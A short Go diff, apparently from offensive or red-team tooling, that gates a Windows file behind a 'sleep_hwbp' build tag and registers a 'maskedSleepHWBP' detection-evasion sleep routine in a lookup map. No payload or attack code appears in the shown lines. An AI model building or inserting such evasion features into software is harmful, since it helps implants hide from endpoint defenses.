@@ -1,4 +1,4 @@
-//go:build windows && amd64
+//go:build sleep_hwbp && windows && amd64
 
 package evasion
 
@@ -202,3 +202,5 @@ func maskedSleepHWBP(ms uint32) error {
 
 	return nil
 }
+
+func init() { maskFns["hwbp"] = maskedSleepHWBP }
